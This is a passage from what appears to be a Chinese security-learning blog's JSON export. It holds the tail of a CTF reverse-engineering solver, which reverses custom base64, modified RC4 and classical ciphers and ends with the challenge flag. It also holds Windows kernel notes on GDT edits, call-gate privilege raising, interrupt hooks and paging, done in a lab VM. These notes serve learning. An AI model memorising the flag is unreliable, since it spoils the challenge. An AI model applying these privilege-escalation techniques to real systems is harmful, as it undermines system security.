4];//获得低二位再右移四位,自动补0 res[len - 2] = res[len - 1] = &#x27;=&#x27;; break; //最后两个补= case 2: res[len - 4] = base64_map[str[str_len - 2] &gt;&gt; 2]; //剩两个字符时,右移两位得高六位 res[len - 3] = base64_map[(str[str_len - 2] &amp; 0x3) &lt;&lt; 4 | str[str_len - 1] &gt;&gt; 4]; //第一个字符低二位和第二个字符高四位 res[len - 2] = base64_map[(str[str_len - 1] &amp; 0xf) &lt;&lt; 2]; //第二个字符低四位,左移两位自动补0 res[len - 1] = &#x27;=&#x27;; //最后一个补= break; &#125; res[len] = &#x27;\\0&#x27;; //补上字符串结束标识 return res;&#125;unsigned char findPos(const unsigned char* base64_map, unsigned char c)//查找下标所在位置&#123; for (int i = 0; i &lt; strlen((const char*)base64_map); i++) &#123; if (base64_map[i] == c) return i; &#125;&#125;int base64_decode(char* code0)&#123; unsigned char* code = (unsigned char*)code0; unsigned char base64_map[] = &quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;; long len, str_len, flag = 0; char* res; len = strlen((char*)code); if (code[len - 1] == &#x27;=&#x27;) &#123; if (code[len - 2] == &#x27;=&#x27;) &#123; flag = 1; str_len = len / 4 * 3 - 2; &#125; else &#123; flag = 2; str_len = len / 4 * 3 - 1; &#125; &#125; else str_len = len / 4 * 3; res = (unsigned char*)malloc(sizeof(unsigned char) * str_len + 1); for (int i = 0, j = 0; j &lt; str_len - flag; j += 3, i += 4) &#123; unsigned char a[4]; a[0] = findPos(base64_map, code[i]); //code[]每一个字符对应base64表中的位置,用位置值反推原始数据值 a[1] = findPos(base64_map, code[i + 1]); a[2] = findPos(base64_map, code[i + 2]); a[3] = findPos(base64_map, code[i + 3]); res[j] = a[0] &lt;&lt; 2 | a[1] &gt;&gt; 4; //取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合 res[j + 1] = a[1] &lt;&lt; 4 | a[2] &gt;&gt; 2; //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合 res[j + 2] = a[2] &lt;&lt; 6 | a[3]; //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合 &#125; switch (flag) &#123; char a[1024]; case 0:break; case 1: &#123; a[0] = findPos(base64_map, code[len - 4]); a[1] = findPos(base64_map, code[len - 3]); res[str_len - 1] = a[0] &lt;&lt; 2 | a[1] &gt;&gt; 4; break; &#125; case 2: &#123; a[0] = findPos(base64_map, code[len - 4]); a[1] = findPos(base64_map, code[len - 3]); a[2] = findPos(base64_map, code[len - 2]); res[str_len - 2] = a[0] &lt;&lt; 2 | a[1] &gt;&gt; 4; res[str_len - 1] = a[1] &lt;&lt; 4 | a[2] &gt;&gt; 2; break; &#125; &#125; res[str_len] = &#x27;\\0&#x27;; memcpy(code0, res, str_len); return str_len;&#125;void __fastcall rc41(unsigned char* a1, const char* a2, unsigned int* a3, int size)&#123; __int64 v3; // kr00_8 int i; // [rsp+20h] [rbp-438h] int j; // [rsp+20h] [rbp-438h] int v6; // [rsp+20h] [rbp-438h] int v7; // [rsp+24h] [rbp-434h] int v8; // [rsp+24h] [rbp-434h] int k; // [rsp+28h] [rbp-430h] int v10; // [rsp+30h] [rbp-428h] int v11; // [rsp+34h] [rbp-424h] int v12[258]; // [rsp+50h] [rbp-408h] for (i = 0; i &lt; size; i++) &#123; a3[i] = a1[i]; &#125; v7 = 0; for (i = 0; i &lt; 256; ++i) v12[i] = i; for (j = 0; j &lt; 256; ++j) &#123; v3 = a2[j % strlen(a2)] + v12[j] + v7; v7 = v3 % 256; v10 = v12[j]; v12[j] = v12[v7]; v12[v7] = v10; &#125; v8 = 0; v6 = 0; for (k = 0; k&lt;size; ++k) &#123; v6 = (v6 + 1) % 256; v8 = (v12[v6] + v8) % 256; v11 = v12[v6]; v12[v6] = v12[v8]; v12[v8] = v11; a1[k] = v12[(v12[v6] + v12[v8]) % 256] ^ (a3[k] - 57 + 256) % 256; &#125;&#125;void __fastcall rc42(char* a1, const char* a2, int* a3, int size)&#123; __int64 v3; // kr00_8 int i; // [rsp+20h] [rbp-438h] int j; // [rsp+20h] [rbp-438h] int v6; // [rsp+20h] [rbp-438h] int v7; // [rsp+24h] [rbp-434h] int v8; // [rsp+24h] [rbp-434h] int k; // [rsp+28h] [rbp-430h] int v10; // [rsp+30h] [rbp-428h] int v11; // [rsp+34h] [rbp-424h] int v12[258]; // [rsp+50h] [rbp-408h] for (i = 0; i &lt; size; i++) &#123; a3[i] = a1[i]; &#125; v7 = 0; for (i = 0; i &lt; 256; ++i) v12[i] = i; for (j = 0; j &lt; 256; ++j) &#123; v3 = a2[j % strlen(a2)] + v12[j] + v7; v7 = v3 % 256; v10 = v12[j]; v12[j] = v12[v7]; v12[v7] = v10; &#125; v8 = 0; v6 = 0; for (k = 0; k &lt; size; ++k) &#123; v6 = (v6 + 1) % 256; v8 = (v12[v6] + v8) % 256; v11 = v12[v6]; v12[v6] = v12[v8]; v12[v8] = v11; a1[k] = v12[(v12[v8] + v12[v6]) % 256] ^ a3[k] ^ 0x39; &#125;&#125;void decrypt_case1(char* a1, const char* a2) &#123; int lena1 = strlen(a1); int lena2 = strlen(a2); for (int i = 0; i &lt; lena1; ++i) &#123; int key = a2[i % lena2]; if (a1[i] &gt;= &#x27;A&#x27; &amp;&amp; a1[i] &lt;= &#x27;Z&#x27;) &#123; a1[i] = (a1[i] - (key % 26) - &#x27;A&#x27; + 26) % 26 + &#x27;A&#x27;; &#125; else if (a1[i] &gt;= &#x27;a&#x27; &amp;&amp; a1[i] &lt;= &#x27;z&#x27;) &#123; a1[i] = (a1[i] - (key % 26) - &#x27;a&#x27; + 26) % 26 + &#x27;a&#x27;; &#125; else if (a1[i] &gt;= &#x27;0&#x27; &amp;&amp; a1[i] &lt;= &#x27;9&#x27;) &#123; a1[i] = (a1[i] - (key % 10) - &#x27;0&#x27; + 10) % 10 + &#x27;0&#x27;; &#125; &#125;&#125;void decrypt_case2(char* a1, const char* a2) &#123; int num_inv[] = &#123; 1,9,21,15,3,19,7,23,11,5,17,25 &#125;; int lena1 = strlen(a1); int lena2 = strlen(a2); for (int j = 0; j &lt; lena1; ++j) &#123; char base = 0; if (a1[j] &gt;= &#x27;A&#x27; &amp;&amp; a1[j] &lt;= &#x27;Z&#x27;) &#123; base = &#x27;A&#x27;; &#125; else if (a1[j] &gt;= &#x27;a&#x27; &amp;&amp; a1[j] &lt;= &#x27;z&#x27;) &#123; base = &#x27;a&#x27;; &#125; else continue; int inv = num_inv[j % 12]; int shift = a2[j % lena2]; int val = (a1[j] - base - shift + 26) % 26; a1[j] = (val * inv) % 26 + base; &#125;&#125;void decrypt_case3(char* a1, const char* a2) &#123; int lena1 = strlen(a1); int v10 = a2[0] % 10 + 2; // 必须与加密时相同的行数 int cols = (lena1 + v10 - 1) / v10; // 最大列数 // 分配二维矩阵（考虑不完整行） char** Block = malloc(v10 * sizeof(char*)); for (int i = 0; i &lt; v10; ++i) &#123; Block[i] = malloc(cols + 1); // 每行分配最大可能长度+1 memset(Block[i], 0, cols + 1); &#125; // 动态计算每行的实际列数 int* row_lengths = malloc(v10 * sizeof(int)); for (int i = 0; i &lt; v10; ++i) &#123; row_lengths[i] = lena1 / v10; // 基本列数 if (i &lt; lena1 % v10) row_lengths[i]++; // 处理余数分配 &#125; // 按行填充数据（考虑不等长行） int pos = 0; for (int row = 0; row &lt; v10; ++row) &#123; for (int col = 0; col &lt; row_lengths[row]; ++col) &#123; if (pos &lt; lena1) &#123; Block[row][col] = a1[pos++]; &#125; &#125; &#125; // 按列读取恢复原始数据（处理不规则形状） pos = 0; for (int col = 0; col &lt; cols; ++col) &#123; for (int row = 0; row &lt; v10; ++row) &#123; // 只读取有效列范围内的数据 if (col &lt; row_lengths[row] &amp;&amp; pos &lt; lena1) &#123; a1[pos++] = Block[row][col]; &#125; &#125; &#125; a1[pos] = &#x27;\\0&#x27;; // 终止字符串 // 清理内存 free(row_lengths); for (int i = 0; i &lt; v10; ++i) free(Block[i]); free(Block);&#125;void decrypt_case4(char* str, const char* key) &#123; // 手动计算有效字符串长度（包含空格） int len = 0; while (str[len] != &#x27;\\0&#x27;) len++; if (len == 0) return; // 计算等效逆向移位次数 int shift = (key[0] % 10 + 2) % len; // 加密时的实际有效移位 int decrypt_shift = (len - shift) % len; // 执行逆向循环右移 for (int i = 0; i &lt; decrypt_shift; ++i) &#123; // 保存最后一个有效字符（包括空格） char last = str[len - 1]; // 整体右移一位 for (int j = len - 1; j &gt; 0; --j) &#123; str[j] = str[j - 1]; &#125; // 恢复首字符 str[0] = last; &#125;&#125;void decrypt_case5(char* a1, const char* a2) &#123; int lena2 = strlen(a2); int lena1 = base64_decode(a1); for (int i = lena1; i &lt; lena1 + 10; i++) &#123; a1[i] = 0; &#125; for (int i = 0; i &lt; lena1; ++i) &#123; a1[i] ^= (a2[i % lena2] + 57); &#125; //printf(&quot;%s&quot;, a1);&#125;void decrypt_case6(char* a1,const char* a2) &#123; int lena1 = base64_decode(a1); unsigned int* a3 = malloc(100); memset(a3, 0, 100); for (int i = lena1; i &lt; lena1 + 10; i++) &#123; a1[i] = 0; &#125; rc41(a1, a2, a3, lena1);&#125;void decrypt_case7(char *a1,const char* a2) &#123; int lena1 = base64_decode(a1); int* a3 = malloc(100); for (int i = lena1; i &lt; lena1 + 10; i++) &#123; a1[i] = 0; &#125; rc42(a1, a2, a3, lena1);&#125;void crypt(char *a1,const char* a2,int a3) &#123; switch (a3) &#123; case 1: decrypt_case1(a1, a2); break; case 2: decrypt_case2(a1, a2); break; case 3: decrypt_case3(a1, a2); break; case 4: decrypt_case4(a1, a2); break; case 5: decrypt_case5(a1, a2); break; case 6: decrypt_case6(a1, a2); break; case 7: decrypt_case7(a1, a2); break; &#125;&#125;int main() &#123; char v15[8]; char v16[3]; char v11[3]; int i, j, v10; char i1[100] = &quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;; char i2[100] = &quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;; char i3[100] = &quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;; //aaaaaaaaaaaabbbbbbbbbbbbcccccccccccc v15[0] = 1; v15[1] = 5; v15[2] = 6; v15[3] = 3; v15[4] = 4; v15[5] = 1; v15[6] = 4; v15[7] = 5; v16[0] = 0; v16[1] = 1; v16[2] = 2; v11[0] = 0; v11[1] = 0; v11[2] = 0; char ca1[] = &#123; 1,4,5,4,1,4,3,4,1,6,3,4,5,6,3,1,5,6,1,5,1, &#125;; char jj[] = &#123; 2,1,0,2,1,0,2,1,0,2,1,0,2,1,0,2,1,0,1,0,0, &#125;; for (int i = 0; i &lt; 21; i++) &#123; switch (jj[i]) &#123; case 0: crypt(i1, i2, ca1[i]); printf(&quot;i1 i2\\n%d-%d:&quot;, jj[i], ca1[i]); printf(&quot;%s&quot;, i1); printf(&quot;\\n&quot;); break; case 1: crypt(i2, i3, ca1[i]); printf(&quot;i2 i3\\n%d-%d:&quot;, jj[i], ca1[i]); printf(&quot;%s&quot;, i2); printf(&quot;\\n&quot;); break; case 2: crypt(i3, i1, ca1[i]); printf(&quot;i3 i1\\n%d-%d:&quot;, jj[i], ca1[i]); printf(&quot;%s&quot;, i3); printf(&quot;\\n&quot;); break; &#125; printf(&quot;i1:%s\\ni2:%s\\ni3:%s\\n\\n&quot;, i1, i2, i3); &#125; //for (i = 0; i &lt; 8; ++i) //&#123; // for (j = 0; j &lt; 3; ++j) // &#123; // if (i &gt;= v16[j]) // &#123; // v10 = v11[j]; // if (v10 &lt; 8) // &#123; // if (j) // &#123; // if (j == 1) // &#123; // //crypt(i2, i3, ca1); // printf(&quot;%d,&quot;, j); // &#125; // else if (j == 2) // &#123; // //crypt(i3, i1, ca1); // printf(&quot;%d,&quot;, j); // &#125; // &#125; // else // &#123; // //crypt(i1, i2, ca1); // printf(&quot;%d,&quot;, j); // &#125; // ++v11[j]; // &#125; // &#125; // &#125; //&#125; for (int i = 0; i &lt; 12; i++) &#123; printf(&quot;%c&quot;, i1[i]); &#125; for (int i = 0; i &lt; 12; i++) &#123; printf(&quot;%c&quot;, i2[i]); &#125; for (int i = 0; i &lt; 12; i++) &#123; printf(&quot;%c&quot;, i3[i]); &#125; //char ca[] = &#123; 0,0,1,0,1,2,0,1,2,0,1,2,0,1,2,0,1,2,0,1,2, &#125;; //for (int i = 0; i &lt; 21; i++) //&#123; // printf(&quot;%d,&quot;,ca[21 -1- i]); //&#125; //for (int i = strlen(ca)-1; i &gt;= 0; i--) //&#123; // switch (ca[i]) &#123; // case 1: // decrypt_case1(); // &#125; //&#125; return 0; //NSSCTF&#123;P4ch3Lbel&#x27;s_C@n0n_1n_D_mAjOr&#125;&#125; 解决了","updated":"2025-10-08T09:41:02.409Z","categories":[{"name":"ctf","slug":"ctf","permalink":"https://l1pmoluy.github.io/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://l1pmoluy.github.io/tags/wp/"}]},{"title":"WindowsStudy01-保护机制&段检测","date":"2025-04-06T11:12:42.000Z","path":"2025/04/06/WindowsStudy01-保护机制&段检测/","text":"保护机制、段、页 保护机制首先铺垫，在前面学过pe文件格式，且写过反射型注入，有一定知识前置 我们知道，一个软件在运行的时候，会分配一个内存中的基地址（虚拟地址），很好，那么明明是在内存中实体存在的为什么叫虚拟地址？我们还知道，地址是线性的0 1 2 …… 0xffffffffh，线性排布，那么问题来了，我的程序加载到内存中，假如说是0x87654321，欸？此时我有一个指令是mov dword ptr [0] , 1，那么会把内存开始地方的东西改动掉，但是内存最开始的东西肯定是很内核的东西，什么对程序的调用啊，什么的之前在反调试有接触过 自然是不能让你随便动他的，那么怎么才能很安全的做到呢 目前我学到的是分段分页，相当于在原本的0x55555555h的地方一刀斩断，后面又开始0x0h（应该如此，后续回来补充） 嗯不是这样的，是分成一段一段然后通过代码段，数据段来区分，这是段保护机制 页保护估计就是进程线程的吧。。。 windbg的一些指令r 查看一些寄存器(r eax | r al | r gdtr) d 查看地址(byte(db) | word(dw) | … ) | (L limit 限制要看多长) | (s 竖着看) e 写内存(用法和d一致) idt和gdtidt和gdt结构前两字节是limit大小，后四字节是地址 idt和gdt的指令sidt sgdt 用例就是把gdt表和idt表加载出来 lidt lgdt 赋值给他 门符框架很好前面虽然很乱但是捋一下就清晰了，本篇文章只用来构造框架，具体的内容将在其他文章细记 门符注意注意，门或符GDT表或IDT中每个单元的名称！！！ 每个单元都有-P位 S位 Type位 P-决定该描述符有效 S-决定该描述符属于什么类型 T-决定改描述符更具体类型 声明1：门和xx段描述符感觉差不多一个意思 s&#x3D;1-段描述符s&#x3D;1是段描述符，这时候的T遵循的图就是 t&lt;8-数据段 GDTt&gt;7-代码段 GDT数据段或代码段，同时无论是数据段还是代码段都解析的都是如下图 s&#x3D;0-系统描述符s&#x3D;0是系统描述符，这时候的T遵循的图就是 t&#x3D;c-调用门 GDT调用门遵循下图 t&#x3D;6 -中断门 IDTint 3 int 2 int 1…遵循下图 t&#x3D;5-任务门 IDT 段描述符段选择符 长度一字节，比如CS里的1B值就是段选择符（0x18是打印cs值会打印出来的） 1B：0000 0000 0001 1 0 11 0011 查找表 请求权限 3，在表中的第3位 0&#x3D;GDT Global Decsrctor Table(全局描述表) 1&#x3D;LDT Local Decsrctor Table(本地描述表) CS 1B 代码段 SS 23 栈段(栈，局部变量) DS 23 数据段(堆，全局变量) ES 23 扩展段(可以还原ds) FS 上下文环境段 R3代表TEB R0代码是KPCR 123456789101112131415161718192021// study02.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include&lt;windows.h&gt;int val=0x100;int val2=0x1;int _tmain(int argc, _TCHAR* argv[])&#123; __asm &#123; mov ax,cs; mov dword ptr ds:[val2],eax; &#125;; printf(&quot;%x\\n&quot;,val2); system(&quot;pause&quot;); return 0;&#125; 段描述符也就是前面的GDT和LDT表的内容 举个例子： kd&gt; r gdtr gdtr&#x3D;80b98800 通过查找指令找到gdt表，gdt表是按照1字也就是两字节的形式为最小单位，所以查找的时候要用dq kd&gt; dq 80b98800 80b98800 0000000000000000 00cf9b000000ffff 80b98810 00cf93000000ffff 00cffb000000ffff 80b98820 00cff3000000ffff 80008bb98c0020ab 80b98830 804093b9b0004fff 0040f30000000fff 80b98840 0000f2000400ffff 0000000000000000 80b98850 800089b9ad200067 800089b9acb00067 80b98860 0000000000000000 0000000000000000 80b98870 800092b9880003ff 0000000000000000 按照上面索引第三个(注意，从0开始数) 00cffb00&#96;0000ffff，和段选择符一样，要拆分分析 对照上表，高字节部分和低字节部分 31 24 19 16 12 8 0 100 c f f b 00 1100 1111 h: b gb0a l hd s t b 0000 ffff l: b l limit:f+ffff&#x3D;0xfffff 段限制大小(sizeof(cs)):(h&amp;l)+(l&amp;l) base:00+00+0000 基址大小(base):(h&amp;b)+(h&amp;b)+(l&amp;b) type:(h&amp;t)b tpye作用见下表 s:(h&amp;s)1 DPL:(h&amp;d)3 p:(h&amp;p)1 p用来证明该段是否有效，1有效，0无效 avl:(h&amp;a)0 0:(h&amp;0)0 D&#x2F;B:(h&amp;b)1 G:(h&amp;g)1 若为1，则以页为单位（影响的是段限制的单位）（一个页4096字节） 转换为hex-&gt;0x1000 故真正限制大小：(limit+1)*(g) 按照上面的计算也就是(0xfffff+1)*0x1000&#x3D;0x1 0000 0000，范围就是0-0xf ffff fff 也就是4个g type作用： 练习代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// study02.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include&lt;windows.h&gt;int val=0x100;int _tmain(int argc, _TCHAR* argv[])&#123; int val2=0x1; //段保护 __asm&#123; mov ax,cs; mov ds,ax; mov eax,dword ptr ds:[val]; //ds:[val]就是全局变量val //mov dword ptr ds:[val2],eax;//直接这样会报错，因为cs给了ds，cs段是可读可执行不可写，这里相当于写入所以不可以 //恢复ds环境 mov ax,es; mov ds,ax; //可以赋值 mov [val2],eax; &#125; printf(&quot;val2=%x\\n&quot;,val2); //0x100 //查看段选择符 __asm &#123; mov ax,cs; mov [val2],eax; &#125;; printf(&quot;cs=0x%x\\n&quot;,val2); //0x1b //对base的探测 __asm &#123; mov ax,0x4b; //这里用windbg将对应gdt表动过，也就是让base+1了 mov ds,ax; mov eax,dword ptr ds:[val]; mov dword ptr ss:[val2],eax; //mov cx,es; //mov ds,cx; &#125; printf(&quot;0x%x\\n&quot;,val2); //正常来说这里是100，但是如果改变base基地址，那么赋值的时候eax给的就是base+offset val2+1，，没有改变val2地址的值，后面恢复了ds就正常了 //同理，将前面的恢复环境注释掉，后面再恢复 __asm &#123; mov cx,es; mov ds,cx; &#125; //若是这样子，应该是没有变化的 ////对段长度的探测 __asm &#123; //limit //mov eax,fs:[0x1000-4];//这里如果是0x1000-4 - 0x1000之内的都会出错，因为超出大小了 //mov val2,eax; //p //在gdt表中将p改成0就可以无效了，这里正常运行上面的那个代码就会报错 &#125; printf(&quot;fs:[0]=0x%x\\n&quot;,val2); system(&quot;pause&quot;); return 0;&#125; 再次总结一下，cs,ds这些段如果是cs:[x]，那么会调用代码段中的x地址，但是如果只是cs，也就是cs中的值，并不是基地址，而是段选择符，也就是可以拆解的，有时候就会去对照gdt表，然后查看gdt里的东西 d&#x2F;b话解上题，通过windbg更改端段描述符cs,ds可以做到全局改变，d&#x2F;b的作用是用来规定操作符大小的，比如正常push指令push的是一字节，但是如果d&#x2F;b位改变，这里有可能只push一字等，也就是本来的push xx xx xx xx就会变成push xx xx 个人感觉就像是改变这个电脑是32位还是16位还是64位，存在用处也很明显，就是可以兼容低版本（这里注意改变的是段描述符里的d&#x2F;b也就是说，该段相关改变，比如ss(栈)改了的话，call指令就会有问题，因为call相当于pop jmp，但是操作字节变少了，原本是call 0x12345678，pop出来就只有0x1234，jmp 0x1234，所以就会出现问题 win系统内部权限分化，R0和R3是内核层和应用层，这个倒是很好理解，去调用 判别当前代码是当前层的办法就是CS和SS 这里阐述一个观点，段的存在是划分硬件资源的，内存中是线性排列的一群1和0，是段来定位划分每一块的作用，最后cs，ss，ds诸如此类的段就是对这个划分块的描述 DPL: Descriptor Privilege Level 描述符特权级 CPL: Current Privilege Level 当前特权级 CS段描述符的DPL RPL: Request Privilege Level 请求者特权级 CS DS SS，在段描述符的后三位 这里卡了有点久，起初我不是很理解gpt所说的 段类型 DPL 规则 代码段 CPL ≤ DPL 数据段 max(CPL, RPL) ≤ DPL 栈段（SS） RPL&#x3D;CPL &#x3D; DPL 上述表格，但是结合上图就会发现，0才是内核层，假如现在代码是内核代码，那么这段代码的DPL就是0，如果你自己写了一段代码，那么大概率在R3，应用层，此时你的代码描述符cs里的CPL就会是3（DPL应该也是3） 此时如果你要调用内核层的代码，则会访问失败(但我不知道这个怎么调用) 以此类推，后两个也不难理解 提权跳转-符 嗯后面的我好像也懂了，补刚刚的坑，那么众所周知cs在应用层是23，那么 call 23h:0040100h就是跳转到当前程序的0x401000地址，并且跳跃过去的段权限对应是3，那么在gdt表中把一个无用位置改成CPL值为2的cs，然后手动call 48h:4010000h，48就是改变的gdt表导向，也就是call提权 那么跳转指令还有jmp\\ret\\retf等等，这些的跳转可以不可以提权呢 jmp 在调用门 只能同权限跳转 retf 只能同权限或向低权限跳转 call 同权限或提权 本来换下一节课了，听到调用门一愣，调用门似乎他没说，我不清楚为什么感觉容易漏东西，所以自己补了一下，网上找了一篇文章讲的还不错 我一看这个调用门描述符，和段描述符十分相似 所以段又描述符，调用门也有？后面看来好像是这样的，而且构造和段描述符差不多 我去，，，误会了我没看到这节课，好吧回来接着学 那么前面说的和提权跳转差不多，当然也有可能是这两个本来就是一样的，所以我决定好好复现这个程序 那么首先我们要获得cs的值，并且分解分析 123456789int _tmain(int argc, _TCHAR* argv[])&#123; int a; __asm&#123; mov ax,cs; mov a,eax; &#125; printf(&quot;%x&quot;,a);&#125; 这里获取的值是1b -&gt;0001 1011，也就是3的位置 r gdtr获取地址-80b98800 dp 80b98800后发现80b98848后的位置适合放更改DPL的位置 原值是0000ffff 00cffb00-f-1111-DPL-11 需要改成DPL-00-1001-9-0000ffff 00cf9b00 我突然发现有现成的1，其实可以改成0000 1011- b 那么接下来要获得函数的地址-0x0401000 123456789101112131415161718192021#include &quot;stdafx.h&quot;void __declspec(naked) test()&#123; __asm&#123; retf; &#125;&#125;int _tmain(int argc, _TCHAR* argv[])&#123; printf(&quot;%x\\n&quot;,test);//0x0401000 char bufcode[6]=&#123; 0x00, 0x0, 0x0, 0, 0x48, 0&#125;; *(int *)&amp;bufcode[0]=(int )test; __asm&#123; //push addr; //jmp fword ptr bufcode; jmp far bufcode;addr: &#125; return 0;&#125; int 3 哈哈中断一下，因为确实这里中断了好几次，我当时自己写的代码一直都不能跑，会中断，我复现课里的内容也还是不可以，最后发现他改的是 00cffb00&#96;0000ffff 欸？这不是没改嘛，对就是没改，那不对呀，没改怎么提权了，哎这里真的想了很久，因为RPL在段描述符中，他用的是48，0100 1000，RPL是0，R0层，哦对他也没说这个实验可以提权，而是申请对吧 。。所以这里就是这个啊。。。哎不记了接着看，反正也懂了，始终切记DPL在gdt里，RPL在段描述符里 系统段描述符这里的门是系统段的门，也算是描述符，就像是指引路的传送门，比如调用门，门后的就是代码段，中断门，门后的是处理中断的代码段，任务门门后的是TSS任务段 还是看完再测试比较好 调用门调用门作用是跳转提供基地址等一系列参数的 具体框架在另一篇文章，这里只阐述注意点 1.调用门即地址前寻址的cs ds ss，但是并不是段选择符的那些cs ds ss，call jmp等指令使用到调用门时便遵循调用门解析跳转 2.jmp xx:aaaa 遵循xx的地址跳转 3.提权跳转，先解析需跳转地址，构造出对应的调用门 4.调用门结构中Segment Selector(段选择符)就是前面的符，以符来作为基地址跳转，所以在这里可以选择R0或R3层，进行提权 5.jmp 在调用门 只能同权限跳转 | retf 只能同权限或向低权限跳转 | call 同权限或提权 中断门中断门作用是int系列或中断指令触发时，决定跳转到哪个地方来解决 具体框架在另一篇文章，这里只阐述注意点 1.中断门即int 1&#x2F;2&#x2F;3，当程序运行上述命令时，遵循中断门的跳转，类调用门 2.int xx 遵循xx的地址跳转 3.查看idt表，会发现，0 1 2 3会有对应可分析的中断门，每个单元都是int后对应的中断门，所以自己如果要增加中断门在32元素位置，那么中断门就是int 32 4.中断门的跳转极其类似调用门，所以不多记 陷阱门陷阱门≈中断门 陷阱门与中断门几乎一致，这里只阐述不同点 1.中断门清除eflag里的VM NT IF TF位 陷阱门不清楚IF位，所以中断门会造成阻塞，需要iretd来返回，或者在进入中断门之前sti，陷阱门不必 任务门在不同段跳转的时候，比如R0跳R3这种跨段跳转的时候，栈(ss)环境和esp是会改变的，前面实验就能看出 所以任务门担任的就是承接作用 ps:框架越来越完善了 还是老规矩，这里只阐述注意点 基于中断门的hook int 3 hook通过更改int 3对应cs段基地址然后触发int 3hook到自己的函数 101012这里火哥的课就又开始”架空”起来了，很多新名词完全没有说过，看一下这篇文章-101012部分，火哥的课不行就跳过这一节，里面也说了”Cr3” 插个眼，这里! process 0 0这个指令还不太懂物理地址懂一半，之前搞项目那会学了一点，但是没太深入，我估计后面学页的时候可以相辅相成 前进一小步，文明一大步 ——男厕 页の前章线性地址对应物理地址假如我在记事本中写了一串字符”helloworld”，然后用工具比如CE查找到该字符串在内存中的地址00484C58那么可以按照10-10-12的方式解析该虚拟地址的物理地址，所谓101012就是bit位排布，首先把000AE928换成二进制bit位形式0000 0000 0100 1000 0100 1100 0101 1000，然后划分 10 00 0000 0001 1 页目录 单位1*4byte PDE 10 00 1000 0100 84 页表项 单位1*4byte PTE 12 1100 0101 1000 C58 页内偏移 单位1byte 于是就可以找物理地址了，于是就弥补了前文的无知，cr3是什么？cr3就是改进程(书)地址的寄存器，代表了该书，用! process 0 0列举所有cr3的值找到notepad.exe，得到物理基地址03d75000 ! dd 03d75000来获取目录物理地址的值，目录中存放的是指针，也不难想到指针指向的地方就是书本内容的地方，比如这个要找的就是! dd 03d75000+14-&gt;3cbc7867，这里要去掉867，这个是页属性得到3cbc7000，这就是当前页的起始地址，再接着加上844，得到3d25b867，同理3d25b000，于是就可以看里面的内容了 123456789kd&gt; !db 3d25b000+C58#3d25bc58 68 00 65 00 6c 00 6c 00-6f 00 77 00 6f 00 72 00 h.e.l.l.o.w.o.r.#3d25bc68 6c 00 64 00 31 00 31 00-00 00 00 00 00 00 00 00 l.d.1.1.........#3d25bc78 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#3d25bc88 00 00 00 00 00 00 00 00-08 00 00 08 58 82 00 00 ............X...#3d25bc98 50 87 48 00 70 e9 47 00-06 00 00 06 5a 82 00 00 P.H.p.G.....Z...#3d25bca8 50 87 48 00 70 e9 47 00-00 00 00 00 04 00 3b 00 P.H.p.G.......;.#3d25bcb8 9b a1 37 7b 40 82 00 00-90 4a 48 00 68 09 48 00 ..7&#123;@....JH.h.H.#3d25bcc8 61 00 72 00 73 00 f6 ff-89 a1 36 68 4e 82 00 08 a.r.s.....6hN... 页属性当直接查看CR3的时候，看到的后三位并不是0，其实这里代表的就是页属性 可以对照该表 P0代表无效 US1代表R3可访问，0代表R0才能访问 A是否被改变过，改变1 G如果是1的话，是不会刷新缓存值的 没什么可记的，看完课就好 页の终章挂页VirtrualAlloc申请地址在赋值前是不会挂物理页的，在memset等操作进行之后才会赋值，又众所周知，0地址是不可赋值的，因为0地址没有挂物理页，那么就会有一种程序，给0地址挂页 123456789101112131415161718192021// study05.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include&lt;Windows.h&gt;int _tmain(int argc, _TCHAR* argv[])&#123; int *a = 0; int * x = (int* )VirtualAlloc(NULL,0x100,MEM_COMMIT,PAGE_EXECUTE_READWRITE); memset(x,0,0x100); printf(&quot;%x\\n&quot;,x); system(&quot;pause&quot;); //手动挂页 *a=100; printf(&quot;%x\\n&quot;,*x); system(&quot;pause&quot;); return 0;&#125;这个还是很好玩的 页下这个感觉不太好记，比较散，应该也不容易忘就不急了，记脑子里 TLB虚拟页帧 物理页帧 attr属性 次数 PCID 本质是缓存，里面可以临时存储最近用过的联系？然后再次使用的时候可以先碰撞TLB，看看有没有现成的联系，没有再拆","updated":"2025-10-08T09:42:41.708Z","categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"}],"tags":[{"name":"windows深度学习","slug":"windows深度学习","permalink":"https://l1pmoluy.github.io/tags/windows%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"WindowsStudy00-配置环境","date":"2025-03-28T06:42:31.000Z","path":"2025/03/28/WindowsStudy00-配置环境/","text":"windows内核学习前文——配置环境 开始内核学习前先配置一下环境与驱动编译环境 学习windows貌似要配三个 win7 x86,win7 x64,win10 以win7 x86为例 镜像地址：https://msdn.itellyou.cn/ 装镜像：https://blog.csdn.net/weixin_48886225&#x2F;article&#x2F;details&#x2F;134124245 扩展盘：https://zhuanlan.zhihu.com/p/95133122 VS&amp;win7有点难受，我在配置win7x64的时候发现总是没有网络，以及VMtools始终安装不上 现在的主线任务其实就是在一个win7虚拟机上下载一个VS2019 今天再次尝试vm tools响应了，但是中途卡死了，初次猜测是运行内存给少了（我给了4个g）我关机换了8个g再试试 仍然卡死了，主界面会有一个弹窗一直在卡住，导致点不了别的选项我再找找文章 也是踩了坑，其实下载VS2019可以在主机也就是自己的电脑上下载。。。 所以我把2022卸了，下载2019https://blog.csdn.net/weixin_44711063&#x2F;article&#x2F;details&#x2F;117164628这里有相关文章 